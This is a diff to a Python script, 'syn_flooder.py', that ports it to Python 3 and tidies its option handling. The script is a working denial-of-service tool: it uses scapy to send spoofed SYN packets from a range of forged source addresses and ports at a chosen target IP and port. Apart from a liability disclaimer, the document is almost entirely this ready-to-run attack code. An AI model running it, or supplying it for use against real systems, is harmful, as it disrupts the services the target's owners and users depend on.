@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 """Simple SYN Flooder and spoofer
  - @mjdubell
@@ -9,69 +9,60 @@ The user is the only one responsible for any damages. By using this
 software you agree with the terms.
 
 Usage:
-  syn_flooder.py <dst_ip> <dst_port> [--sleep=<sec>] [-v] [-vv]
+  syn_flooder.py <dst_ip> <dst_port> [--sleep=<sec>] [--verbose] [--very-verbose]
 
 Options:
   -h, --help            Show this screen.
   --version             Show version.
-  --sleep=<sec>         How many seconds to sleep betseen scans [default: 0].
-  -v, --verbose         Show addresses being spoofed.
-  -vv, --very-verbose   Display everything.
+  --sleep=<seconds>     How many seconds to sleep betseen scans [default: 0].
+  --verbose             Show addresses being spoofed. [default: False]
+  --very-verbose        Display everything. [default: False]
 
 """
 from docopt import docopt
 import logging
+import signal
 import sys
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
+
 def main(arguments):
-	src_net = "192.168.250."
-	dst_ip = arguments["<dst_ip>"]
-	dst_port = int(arguments["<dst_port>"])
+    src_net = "192.168.250."
+    dst_ip = arguments["<dst_ip>"]
+    dst_port = int(arguments["<dst_port>"])
+    sleep = int(arguments["--sleep"])
+    verbose = arguments["--verbose"]
+    very_verbose = arguments["--very-verbose"]
 
-	if arguments["--verbose"] == 1:
-		verbose = True
-		double_verbose = False
-	elif arguments["--verbose"] == 2:
-		double_verbose = True
-		verbose = True
-	else:
-		double_verbose = False
-		verbose = False
-	
-	if int(arguments["--sleep"]) != 0:
-		sleep = True
-		seconds = int(arguments["--sleep"])
-	else:
-		sleep = False
-		seconds = 0
+    signal.signal(signal.SIGINT, lambda n, f: sys.exit(0))
 
-	print("\n###########################################")
-	print("# Starting Denial of Service attack...")
-	print("###########################################\n")
-	for src_host in range(1,254):
-		if verbose or double_verbose:
-			print("[*] Sending spoofed SYN packets from %s%s" % (src_net, src_host))
-			print("--------------------------------------------")
+    print("\n###########################################")
+    print("# Starting Denial of Service attack...")
+    print(f"# Target: {dst_ip}")
+    print("###########################################\n")
+    for src_host in range(1,254):
+        if verbose or very_verbose:
+            print(f"[*] Sending spoofed SYN packets from {src_net}{src_host}")
+            print("--------------------------------------------")
 
-		for src_port in range(1024, 65535):
-			if double_verbose:
-				print("[+] Sending a spoofed SYN packet from %s%s:%s" % (src_net, src_host, src_port))
+        for src_port in range(1024, 65535):
+            if very_verbose:
+                print(f"[+] Sending a spoofed SYN packet from {src_net}{src_host}:{src_port}")
 
-			# Build the packet
-			src_ip = src_net + str(src_host)
-			network_layer = IP(src=src_ip,dst=dst_ip)
-			transport_layer = TCP(sport=src_port, dport=dst_port,flags="S")
-			
-			# Send the packet
-			send(network_layer/transport_layer,verbose=False)
-			
-			if sleep:
-				time.sleep(seconds)
+            # Build the packet
+            src_ip = src_net + str(src_host)
+            network_layer = IP(src=src_ip, dst=dst_ip)
+            transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")
 
-	print("[+] Denial of Service attack finished.")
+            # Send the packet
+            send(network_layer/transport_layer, verbose=False)
+
+            if sleep != 0:
+                time.sleep(sleep)
+
+    print("[+] Denial of Service attack finished.")
 
 if __name__ == '__main__':
-    arguments = docopt(__doc__, version="SYN Flooder 1.0")
+    arguments = docopt(__doc__, version="SYN Flooder 1.5")
     main(arguments)
